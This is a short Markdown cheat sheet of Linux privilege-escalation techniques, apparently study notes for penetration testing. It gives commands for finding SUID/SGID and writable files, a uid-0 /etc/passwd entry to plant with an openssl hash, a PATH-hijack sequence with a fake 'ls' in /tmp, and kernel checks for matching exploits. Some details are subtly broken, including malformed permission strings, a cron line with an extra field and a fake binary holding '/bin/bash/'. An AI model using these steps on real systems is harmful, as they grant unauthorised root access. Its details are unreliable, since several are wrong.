# Linux privilege escalation

## Abusing SUID/GUID files

- SUID: `rws-rwx-rwx`
- GUID: `rwx-rws-rwx`

```bash
find / -perm /4000 -type f 2>/dev/null     # SUID
find / -perm /u=s  -type f 2>/dev/null     # SUID
find / -perm /2000 -type f 2>/dev/null     # SGID
find / -perm /g=s  -type f 2>/dev/null     # SGID
find / -perm /6000 -type f 2>/dev/null     # SGID + SUID
find / -perm /u=s,g=s -type f 2>/dev/null  # SGID + SUID
```


## Finding writeable files

```
find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
```


## Exploiting a writeable /etc/passwd

- Line format
```
username:password:uid:gid:info:home:shell
```

- Example line 

```
admin:x:0:0:root:/root:/bin/bash
```

- Generate password hash 

```
openssl passwd -1 -salt [salt] [password]
```

## Escaping executables

```bash
sudo -l
```

[https://gtfobins.github.io/](https://gtfobins.github.io/)

## Exploiting Crontab

- View scheduled cron jobs

```
cat /etc/crontab
```

- Cronjob format

| keyword | meaning                           |
| :------ | :-------------------------------- |
| \#      | ID                                |
| m       | Minute                            |
| h       | Hour                              |
| dom     | Day of the month                  |
| mon     | Month                             |
| dow     | Day of the week                   |
| user    | What user the command will run as |
| command | What command should be run        |


**\# m h dom mon dow user command**

```
17 * 1 * * * root cd / && run-parts --report /etc/cron.hourly
```

## Exploiting the PATH variable

> Rewrite the PATH variable to point to an imitating executable that is being called within a script with SUID privileges.

```bash
echo $PATH
cd /tmp
echo "/bin/bash/" > ls
chmod +x ls
export PATH=/tmp:$PATH
```


## Checking for kernel exploits

- Crossmatching both of these for a suitable exploit

```
uname -a
lsb_release -a
```


## More Info

* [https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
* [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-\_linux.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html)
* [https://payatu.com/guide-linux-privilege-escalation](https://payatu.com/guide-linux-privilege-escalation)

